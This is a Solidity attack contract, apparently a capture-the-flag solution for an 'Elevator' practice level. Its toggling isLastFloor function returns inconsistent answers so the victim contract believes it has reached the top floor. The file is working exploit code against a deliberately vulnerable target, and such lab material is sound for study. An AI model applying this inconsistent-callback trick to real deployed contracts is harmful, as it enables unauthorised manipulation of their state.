// SPDX-License-Identifier: MIT
// Locked pragma
pragma solidity 0.8.0;

// Victim contract import.
import './Elevator.sol';

/// @title Attack contract, going to the top of the building!
/// @author Web3 Blockchain Developer
contract ElevatorAttack {
    /** Public state variable of boolean value type, assigned as false, 
    then as true in isLastFloor function from the Building interface. */
    bool public toggle = true;
    /** Public state variable of address value type, assigned in constructor
    as target, called in setTop attack function. */
    Elevator public target;

    /// @notice Assigns victim address as target.
    constructor(address _targetAddress) public {
        target = Elevator(_targetAddress);
    }

    /** Player will call goTo function using this isLastFloor function in the
    Building interface, to pass the if statement (! building.isLastFloor(_floor))
    with !toggle set as false. This will allow player to set floor as top is true
    once if statement has been passed. */
    function isLastFloor(uint) public returns (bool) {
        // Returns false bool.
        toggle = !toggle;
        // Returns true bool, to set floor as top is true.
        return toggle;
    }

    /** @notice Player will call goTo function in victim contract and enter floor value 
    to start attack. */
    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}